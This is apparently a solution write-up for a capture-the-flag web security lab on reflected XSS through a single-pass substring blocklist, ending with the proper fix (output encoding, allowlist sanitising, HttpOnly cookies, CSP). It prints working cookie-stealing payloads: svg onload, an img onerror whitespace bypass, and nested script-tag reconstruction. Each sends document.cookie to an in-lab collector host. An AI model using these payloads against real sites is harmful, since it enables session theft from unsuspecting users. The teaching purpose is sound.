# Solution — Reflected XSS: Filter Bypass Ladder (blocked `<script>` tags)

## Classification

**CWE-79 / OWASP A03:2021 – Injection.** A request parameter (`subject`) reaches
an HTML output context with neither a correct output-encoding step nor an
allowlist — only a naive substring **denylist** — so attacker markup executes in
the victim's browser.

## The sink and the "sanitiser"

`GET /` reflects `?subject=` into a `<div class="subject">` with **no HTML
escaping**. In front of it sits a single-pass substring blocklist:

```python
_BLOCKLIST = ("<script", "</script", "javascript:", "onerror=")

def _filter(value):
    for tok in _BLOCKLIST:
        value = re.sub(re.escape(tok), "", value, flags=re.IGNORECASE)  # one pass, once per token
    return value
```

Two structural weaknesses make this exploitable:

1. **It is a denylist.** It enumerates four _spellings_ of "run JavaScript". Any
   spelling it forgot passes straight through and is reflected raw. Denylists
   fail **open**.
2. **It is single-pass.** Each token is removed once and the result is never
   re-scanned — so a blocked token can be _reconstructed_ after the filter runs.

Confirm the sink is raw with a value the list ignores:

```
GET /?subject=<b>x</b>   →   ...<div class="subject"><b>x</b></div>...   (bold, not literal)
GET /?subject=<script>alert(1)</script>   →   the <script.../</script are stripped
```

## The delivery model

You cannot read the admin's cookie from your own browser (the same-origin policy
scopes `document.cookie` to whoever loads the page). You need the **admin's**
browser to execute your JavaScript. `POST /report` is exactly that capability: it
queues a same-site path, and the admin bot visits it every ~2s while logged in.
The bot's session cookie is **not** `HttpOnly`, so JS can read it. The bot only
navigates and waits — it never clicks or submits — so the payload must fire **on
load**.

## The bypass ladder

### Rung 1 — an unblocked auto-firing element (the intended payload)

The blocklist never names `<svg>`/`<img>` or the `onload` handler. `<svg onload>`
executes on load with no click and no `<script>` tag:

```html
<svg
  onload="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
></svg>
```

None of `<script`, `</script`, `javascript:`, `onerror=` appears, so the filter
returns it unchanged. `new Image().src = …` fires a cross-origin GET (image loads
are not subject to the same-origin _read_ barrier — the request still goes out,
which is all we need) to the in-lab collector.

### Rung 2 — a rigid substring beaten by an equivalent variant

Even sticking with `<img>`, the blocklist matches the literal string `onerror=`
with **no whitespace**. HTML lets you put spaces around the `=` between an
attribute name and its value, and the string `onerror\t=` (tab, or a space)
does **not** contain the substring `onerror=`:

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

The parser still wires up the `onerror` handler; the filter never saw a match.
Same idea defeats the list with a handler it simply forgot — `onpointerenter=`,
`onfocus=` (with `autofocus`/`tabindex`), etc.

### Rung 3 — recursive reconstruction defeats a single pass

Because `_filter` deletes each token **once and never re-scans**, you can hide a
blocked token _inside_ a split copy of itself. Deleting the inner copy splices
the outer halves back into the very token you wanted:

```
input:   <scr<scriptipt>            (the inner "<script" is the blocked token)
after removing "<script" once:  <scr + ipt>  =  <script>
```

So a payload built the same way for both the opening and closing tag survives:

```html
<scr<scriptipt>new Image().src='http://collector:9000/report?c='+document.cookie</scr</scriptipt>
```

After the single pass this reconstructs to a live `<script>…</script>`. A filter
that _looped to a fixpoint_ would catch this — but then rungs 1 and 2 still walk
right past it, which is the whole point: patching one spelling never ends.

## End-to-end (rung 1)

```
POST /report      {"url":"/?subject=<svg onload=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\">"}
# wait for the bot to visit (~2s) and the <svg onload> to fire
GET  /oob/received       # app-side proxy to the collector; find /report?c=session%3D<32hex>
POST /solve       {"c":"<32hex>"}     →  FLAG{...}
```

`tests/exploit.py` automates this: submit → poll `/oob/received` → URL-decode the
captured path → parse the 32-hex session → `/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true`
  — **no route off the host**. The stolen cookie can reach the in-lab collector
  but never the internet, so the lab can ship a real cookie-exfil primitive at
  `risk: low`.
- The admin bot's cookie-minting endpoint (`/internal/bot-login`) is firewalled
  to the backend subnet **and** gated by a `BOT_KEY`, so a lab visitor on the
  public side cannot request the admin cookie via `Set-Cookie` and skip the XSS.
- `/internal/queue` is likewise backend-only. The intended reflected-XSS path is
  the _only_ way to obtain the admin session.

## The real fix (not a bigger blocklist)

1. **Allowlist + contextual output encoding.** Stop deleting "bad" substrings
   and instead **encode the value for the HTML context** it lands in. Render the
   subject through an autoescaping template (Jinja2 with autoescape **on**, which
   is the default; Go's `html/template`; React's `{}` text nodes) so `<` becomes
   `&lt;` and the input can only ever be _text_, never markup. If you truly must
   allow some formatting, run the value through a real HTML sanitiser with an
   **allowlist** of tags/attributes (e.g. DOMPurify / a vetted server-side
   library), never a hand-rolled substring blocklist. This kills the injection
   at the source regardless of which tag or handler the attacker reaches for.
2. **`HttpOnly` session cookie.** `Set-Cookie: session=…; HttpOnly` makes
   `document.cookie` unable to read it, so even a successful script injection
   cannot steal the session. Defence in depth: fix both.

A strict `Content-Security-Policy` (no inline event handlers / no inline script)
would also have blocked every rung of this ladder; CSP is explored in later labs.

## Note on the platform (Go → Flask re-platform)

The catalog frames this blocked-tag filter-bypass pattern on a Go stack; this lab
re-platforms it to **Python 3.12 / Flask 3.1 / gunicorn 23** under the project's
Flask-default Hybrid policy, to share the one XSS victim-bot and OOB-collector
harness every other `xss` lab uses. The lesson is **framework-independent**: the
vulnerability is a hand-rolled substring **denylist** feeding an unencoded HTML
sink. The identical footgun exists in Go (`strings.ReplaceAll` blocklists feeding
`text/template` or raw `w.Write`), Node, PHP, and anywhere a developer reaches
for "strip the bad words" instead of "encode for the output context / allowlist".
